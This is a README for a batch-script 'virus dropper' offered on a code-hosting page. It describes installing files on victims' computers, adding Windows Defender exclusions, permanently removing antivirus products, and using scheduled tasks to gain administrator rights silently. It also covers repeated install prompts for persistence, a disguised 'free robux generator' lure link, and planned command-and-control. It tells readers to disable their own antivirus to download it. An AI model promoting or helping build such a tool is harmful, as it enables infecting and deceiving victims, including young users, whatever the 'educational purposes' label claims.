# Virus Dropper by YumYummity
Install files on a victim's computer! It can be any file, as Windows Defender won't interfere!
You can also add a scan exclusion where files can be hidden from Windows Defender.
**Educational Purposes Only!**
Direct installation of the entire code as a .zip file may fail as "virus detected", and it's not wrong! Temporarily disable any anti-viruses and browser protection to download. Delete the "install" folder, and reenable protection!

Obfuscator used made by @moom825
Code: https://github.com/moom825/batch-obfuscator-made-in-python
CURRENTLY, OBFUSCATOR DOESN'T OBFUSCATE FILES CORRECTLY. AS A RESULT, NOTHING CURRENTLY IS OBFUSCATED!

Running this as default won't do much; you need to create your own .exe files!
EXE files inside "install" were NOT MADE BY ME! These are only test files.

_This is disguised as a rickroll. "Free robux generator" "disguised as rickroll" link: https://bit.ly/robuxgenrr_

# Detection
_VirusTotal: https://www.virustotal.com/gui/file/e8446787043eb3257140ac5bc90c7a209bc333cbeb1138a0d339d6e765169444/detection_

Exclusions for other antiviruses are not added; antiviruses won't detect the installer but might detect the installed files.
It will add exclusions for Windows Defender
However, most popular anti-viruses will be automatically deleted and banned from victim's computer with AV.bat

# Todo
(prob wont actually add these but who knows):

PersistentPAYLOAD - MAke the payload hard to delete (multiple copies, re-install, etc)
Make the code easier to use
Add DROPPER (not payload, as that's yours) support for older versions of Windows 10, and more versions like Windows 8, Windows 7
Faster Installs (Make the installs faster, by downloading incredibly low-size files to more hidden locations to be launched. User just thinks main dropper is deleted)
Better PersistentINSTALL
Multiple file support (Technically possible and easy, but too lazy to do it)
More AVs in AV.bat
Partial C&C in Github (for file uploading and updating, Update.bat doesn't really work)
Remove bluescreen (might not even be possible)
Compiling to EXE with _IExpress_ without causing detection
[Most of this stuff is incredibly simple. Most. Like 70% of these. The rest are kinda really hard...]

# Changelog
- PersistentINSTALL (Added to all Install files. This keeps prompting the user to install every minute, until either "yes" is pressed or they find the file/created task and delete it. This automatically runs IF the user did not grant the install file ADMINISTRATOR, which is required to install.)
- Added TaskScheduler to run files as Administrator without prompt
- Compacted files
- Starts main install.bat hidden
- Complete rewrite of code
- Made undetectable by all antiviruses (the dropper, not the payload)
- Added AV.bat to permanently remove all extra antiviruses by running every minute.
- Updated Release v1.7 to add PersistentINSTALL
